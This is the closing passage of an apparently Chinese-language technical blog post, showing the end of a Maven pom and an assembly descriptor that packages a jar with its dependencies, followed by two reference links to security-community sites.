                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

**package.xml**

```xml
<assembly xmlns="http://maven.apache.org/ASSEMBLY/2.1.1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/ASSEMBLY/2.1.1 https://maven.apache.org/xsd/assembly-2.1.1.xsd">

    <id>jar-with-dependencies</id>
    <formats>
        <format>jar</format>
    </formats>
    <includeBaseDirectory>false</includeBaseDirectory>
    <dependencySets>
        <dependencySet>
            <outputDirectory>/</outputDirectory>
            <useProjectArtifact>true</useProjectArtifact>
            <unpack>true</unpack>
            <scope>runtime</scope>
        </dependencySet>
        <dependencySet>
            <outputDirectory>/</outputDirectory>
            <unpack>true</unpack>
            <scope>system</scope>
        </dependencySet>
    </dependencySets>
</assembly>
```

![](https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/10/7d9520e5e03f7cc35b05c85cdc3e41ca.png)

# 0x07 参考

https://www.freebuf.com/news/172753.html

https://xz.aliyun.com/t/11003#toc-0
